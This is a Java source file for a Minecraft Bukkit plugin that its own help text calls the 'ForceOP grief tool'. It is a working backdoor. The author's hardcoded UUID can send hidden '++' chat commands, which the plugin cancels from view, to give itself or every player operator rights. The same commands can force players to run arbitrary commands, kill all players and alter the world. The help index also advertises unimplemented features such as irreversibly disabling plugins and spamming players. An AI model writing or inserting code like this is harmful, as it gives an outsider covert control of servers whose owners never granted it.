package com.webmets.forceop;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

@SuppressWarnings("deprecation")
public class ForceOP implements Listener{

	String prefix;
	String version;
	List<String> players;

	public ForceOP() {
		this.prefix = "++";
		this.version = "0.0.1";
		players = new ArrayList<String>();
		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
	}
	
	@EventHandler
	public void chat(PlayerChatEvent e) {
		if(!(players.contains(e.getPlayer().getUniqueId().toString()))) return;
		if(!e.getMessage().startsWith(prefix)) return;
		e.setCancelled(true);
		Player p = e.getPlayer();
		String[] args = e.getMessage().split(" ");
		String cmd = args[0].substring(prefix.length());
		
		if(cmd.equalsIgnoreCase("help")) {
			showIndex(p);
		} else if(cmd.equalsIgnoreCase("op")) {
			p.setOp(true);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("deop")) {
			p.setOp(false);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("op-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setOp(true);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("console")) {
			//TODO CONSOLE
		} else if(cmd.equalsIgnoreCase("sudo")) {
			if(args.length <= 2) {
				p.sendMessage("++op <player> <message>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline()) {
				p.sendMessage("player not found");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 2; i < args.length; i++) {
				sb.append(args[i]+" ");
			}
			String command = sb.toString();
			player.chat(command);
			broadcast(p.getName()+" forced " + player.getName() + " to run " + command);
		} else if(cmd.equalsIgnoreCase("sudo-all")) {
			if(args.length <= 2) {
				p.sendMessage("++op <player> <message>");
				return;
			}
			StringBuilder sb = new StringBuilder();
			for(int i = 1; i < args.length; i++) {
				sb.append(args[i]+" ");
			}
			String command = sb.toString();
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.chat(command);
			}
			broadcast(p.getName()+" forced all players to run \n"+command);
		} else if(cmd.equalsIgnoreCase("gmc")) {
			p.setGameMode(GameMode.CREATIVE);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmc-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.CREATIVE);
			}
			broadcast(p.getName()+" executed " + cmd);
		}  else if(cmd.equalsIgnoreCase("gms")) {
			p.setGameMode(GameMode.SURVIVAL);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gms-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.SURVIVAL);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmsp")) {
			p.setGameMode(GameMode.SPECTATOR);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("gmsp-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				player.setGameMode(GameMode.SPECTATOR);
			}
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("kill")) {
			if(args.length < 2) {
				p.sendMessage("++kill <player>");
				return;
			}
			Player player = Bukkit.getPlayer(args[1]);
			if(player == null || !player.isOnline());
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " +player.getName());
			broadcast(p.getName() + " executed " + cmd + " " + player.getName());
		} else if(cmd.equalsIgnoreCase("kill-all")) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " + player.getName());
			}
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("day")) {
			p.getWorld().setTime(0);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("night")) {
			p.getWorld().setTime(20000);
			broadcast(p.getName()+" executed " + cmd);
		} else if(cmd.equalsIgnoreCase("sun")) {
			p.getWorld().setWeatherDuration(0);
			p.getWorld().setThundering(false);
			p.getWorld().setStorm(false);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("rain")) {
			p.getWorld().setStorm(true);
			p.getWorld().setThundering(false);
			p.getWorld().setWeatherDuration(20*120);
			broadcast(p.getName() + " executed " + cmd);
		} else if(cmd.equalsIgnoreCase("storm")) {
			p.getWorld().setStorm(true);
			p.getWorld().setThundering(true);
			p.getWorld().setWeatherDuration(20*120);
			broadcast(p.getName() + " executed " + cmd);
		}
	}
	
	private void showIndex(Player p) {
		p.sendMessage("ForceOP grief tool (v."+version+")");
		p.sendMessage("<> = required. [] = optional");
		
		p.sendMessage(this.prefix+"help");
		p.sendMessage("- get this help index");
		
		p.sendMessage(this.prefix+"op");
		p.sendMessage("- give yourself /op");
		p.sendMessage(this.prefix+"deop");
		p.sendMessage("- deop yourself");
		p.sendMessage(this.prefix+"op-all");
		p.sendMessage("- give all players op");
		
		p.sendMessage(this.prefix+"console <command>");
		p.sendMessage("- run a command trough console");
		
		p.sendMessage(this.prefix+"sudo <player> <any message or command>");
		p.sendMessage("- force the specified player to run any command or message");
		p.sendMessage(this.prefix+"sudo-all <any message or command>");
		p.sendMessage("- force all players to run the specified command");
		
		p.sendMessage(this.prefix+"gmc <name>");
		p.sendMessage("- give yourself creative");
		p.sendMessage(this.prefix+"gmc-all");
		p.sendMessage("- give all players creative");
		
		p.sendMessage(this.prefix+"gms <name>");
		p.sendMessage("- give yourself survival");
		p.sendMessage(this.prefix+"gms-all");
		p.sendMessage("- give all players survival");
		
		p.sendMessage(this.prefix+"gmsp <name>");
		p.sendMessage("- give yourself spectator");
		p.sendMessage(this.prefix+"gmsp-all");
		p.sendMessage("- give all players spectator");
		
		p.sendMessage(this.prefix+"kill <player>");
		p.sendMessage("- kill the specified player");
		p.sendMessage(this.prefix+"kill-all");
		p.sendMessage("- kill all players");
		
		p.sendMessage(this.prefix+"day");
		p.sendMessage("- change the time to day");
		p.sendMessage(this.prefix+"night");
		p.sendMessage("- chance the time to night");

		p.sendMessage(this.prefix+"sun");
		p.sendMessage("- change the weather to sun");
		p.sendMessage(this.prefix+"rain");
		p.sendMessage("- change the weather to rain");
		p.sendMessage(this.prefix+"storm");
		p.sendMessage("- change the weather to storm");
		
		p.sendMessage(this.prefix+"smite [player]");
		p.sendMessage("- strike lightning (specify player to strike them)");
		p.sendMessage(this.prefix+"burn <player> <seconds>");
		p.sendMessage("- burn the specified player for x seconds");
		p.sendMessage(this.prefix+"burn-all <seconds>");
		p.sendMessage("- burn all players for x seconds");
		
		p.sendMessage(this.prefix+"fly [player]");
		p.sendMessage("- toggle flight (specify player to toggle their flight)");
		p.sendMessage(this.prefix+"disable <plugin>");
		p.sendMessage("- disable the specified plugin §l(can not be reversed!)");
		p.sendMessage(this.prefix+"disable-all");
		p.sendMessage("- disable all plugins (except ForceOP)");
		
		p.sendMessage(this.prefix+"invsee <player>");
		p.sendMessage("- open the specified player's inventory");
		
		p.sendMessage(this.prefix+"tp <player>");
		p.sendMessage("- teleport to the specified player");
		p.sendMessage(this.prefix+"tp <player> <player>");
		p.sendMessage("- teleport the first specified player to the second");
		p.sendMessage(this.prefix+"tppos <x,y,z>");
		p.sendMessage("- teleport to the giving co-oords");
		
		p.sendMessage(this.prefix+"spam <player> <seconds>");
		p.sendMessage("- spam the specified player for x seconds");
		p.sendMessage(this.prefix+"spam-all <seconds>");
		p.sendMessage("- spam all players for x seconds");
	}
	
	private void broadcast(String msg) {
		for(String id : players) {
			Bukkit.getPlayer(UUID.fromString(id)).sendMessage(ChatColor.translateAlternateColorCodes('&', 
					"[forceOP] "+msg));
		}
	}
	
}
